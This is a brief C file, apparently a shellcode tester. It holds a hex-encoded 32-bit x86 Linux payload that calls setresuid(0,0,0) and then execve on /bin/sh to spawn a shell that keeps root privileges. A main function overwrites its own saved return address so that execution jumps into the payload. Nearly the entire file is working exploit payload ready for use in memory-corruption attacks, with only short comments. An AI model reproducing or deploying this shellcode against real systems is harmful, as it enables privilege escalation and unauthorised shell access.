
char shellcode[] =
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";


int main() { //main function

    int *ret; //ret pointer for manipulating saved return.

    ret = (int *)&ret + 2; //setret to point to the saved return

    //value on the stack.

    (*ret) = (int)shellcode; //change the saved return value to the

    //address of the shellcode, so it executes.

}

